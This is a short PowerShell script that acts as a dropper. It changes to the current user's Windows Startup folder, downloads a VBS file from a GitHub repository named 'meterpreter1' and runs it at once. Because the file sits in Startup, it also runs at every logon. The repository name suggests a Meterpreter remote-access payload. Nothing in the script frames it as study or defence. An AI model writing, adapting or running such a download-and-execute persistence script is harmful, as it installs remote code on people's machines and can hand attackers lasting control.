$startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
If (!(Test-Path $startupPath)) {
    Write-Output "Startup path not found: $startupPath"
} Else {
    Set-Location -Path $startupPath
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs", "start.vbs")
        Start-Process "start.vbs"
    } catch {
        Write-Output "Failed to download or start the file. Error: $_"
    }
}
